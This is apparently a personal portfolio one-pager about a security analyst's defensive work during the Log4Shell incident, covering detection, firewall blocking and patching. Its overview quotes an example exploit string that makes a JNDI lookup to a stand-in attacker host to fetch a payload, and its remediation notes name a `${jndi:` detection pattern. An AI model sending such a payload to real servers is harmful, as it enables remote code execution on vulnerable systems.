# Markdown content for the Log4j Incident Response One-Pager

# Log4j Incident Response – One-Pager  
**Role:** Security Operations Analyst  
**Duration:** Dec 2021 – Jan 2022  
**Tools Used:** Qualys, Palo Alto Panorama, SolarWinds, Slack/Bridge Calls  

---

## 📌 What is Log4j?  
Apache Log4j is a Java-based logging utility used in countless enterprise applications. In December 2021, a critical vulnerability—**CVE-2021-44228 (Log4Shell)**—was discovered that allowed **unauthenticated remote code execution (RCE)** via **JNDI lookups** in log messages.

- **CVSS Score:** 10.0 (Critical)  
- **Affected Versions:** ≤ 2.14.1  
- **Fixed in:** 2.15.0 and later  
- **Exploit Example:** `${jndi:ldap://attacker.com/payload}`  

---

## 🕵️‍♂️ Why It Was Dangerous  
- Widespread usage across Java apps (e.g., Minecraft, VMware, Apple iCloud, AWS)  
- Enabled full remote code execution with minimal effort  
- Led to deep supply chain compromise and APT activation  
- Embedded in shadow dependencies (JARs inside JARs)

---

## 🛡️ My Role During the Incident  
I worked on the **Security Operations Team** at TCS supporting AMD’s infrastructure during the crisis. This involved **real-time detection, monitoring, and remediation** in collaboration with L2/L3 teams and external partners.

---

## 🎯 Key Responsibilities & Contributions

### 🔍 Vulnerability Detection
- Managed **Qualys Cloud Agent** to ensure accurate detection (QIDs: 376157, 376178, 91495)  
- Scanned for vulnerable Log4j instances across Linux/Windows systems  
- Flagged high-risk servers for immediate patching and isolation  

### 🌐 Firewall & Perimeter Defense
- Monitored **Palo Alto Panorama** for outbound LDAP/RMI/DNS exploit traffic  
- Applied dynamic firewall rules to **block JNDI lookup patterns**  
- Detected suspicious communication with external command servers  

### 📊 Incident Coordination & Reporting
- Participated in **24x7 bridge calls and war-room sessions**  
- Documented exposure impact, patch status, and escalation workflows  
- Used **SolarWinds** for system discovery, patch prioritization, and health checks  

---

## 🧰 Remediation Actions
- Upgraded Log4j to version **2.16+ / 2.17+**  
- Disabled JNDI lookups: `log4j2.formatMsgNoLookups=true`  
- Applied **WAF rules** and SIEM detection signatures for `${jndi:` patterns  
- Implemented **compensating controls** and monitored patch completion  

---

## 📘 Outcome & Learning
Supported large-scale incident response for a global zero-day exploit involving multiple threat vectors, including suspected **APT activity**. Gained hands-on experience with **real-time detection, cross-functional security collaboration**, and **tool-based mitigation** under pressure.
"""
